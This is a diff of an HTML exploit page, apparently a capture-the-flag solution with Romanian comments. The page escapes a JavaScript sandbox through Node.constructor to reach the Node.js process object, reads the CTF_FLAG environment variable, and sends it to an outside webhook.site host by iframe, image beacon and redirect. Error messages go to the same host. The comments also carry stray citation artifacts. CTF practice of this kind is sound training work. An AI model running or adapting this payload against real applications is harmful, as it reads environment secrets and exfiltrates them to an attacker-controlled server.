@@ -1,22 +1,27 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <iframe id="exfil" src="https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/inceput"></iframe>
     <script>
+        // Folosim un bloc try-catch pentru a vedea eroarea dacă ceva nu merge
         try {
-            // Accesăm constructorul pentru a ajunge la variabila de mediu [cite: 41, 42]
-            const outerRealm = Node.constructor;
-            const process = new outerRealm("return process")();
-            const steag = process.env['CTF_FLAG'];
+            // Accesăm obiectul process din Node.js prin constructorul Node [cite: 36, 41, 42]
+            var outer = Node.constructor;
+            var proc = new outer("return process")();
+            var flag = proc.env.CTF_FLAG;
 
-            // Așteptăm 2 secunde pentru a asigura încărcarea 
+            // Trimitem flag-ul imediat ce l-am obținut printr-o imagine (metodă mai discretă și rapidă)
+            var img = new Image();
+            img.src = "https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?steag=" + flag;
+            
+            // Adăugăm și o redirecționare de siguranță după 1 secundă
             setTimeout(function() {
-                // Trimitem flag-ul către Webhook [cite: 44, 45]
-                document.getElementById('exfil').src = "https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?steag=" + encodeURIComponent(steag);
-            }, 2000);
+                window.location.href = "https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/final?flag=" + flag;
+            }, 1000);
+
         } catch (e) {
-            // Dacă apare o eroare, o trimitem pentru diagnosticare
-            document.getElementById('exfil').src = "https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?eroare=" + encodeURIComponent(e.message);
+            // Dacă apare o eroare, o trimitem la Webhook să știm ce s-a întâmplat
+            var errImg = new Image();
+            errImg.src = "https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/eroare?msg=" + btoa(e.message);
         }
     </script>
 </body>
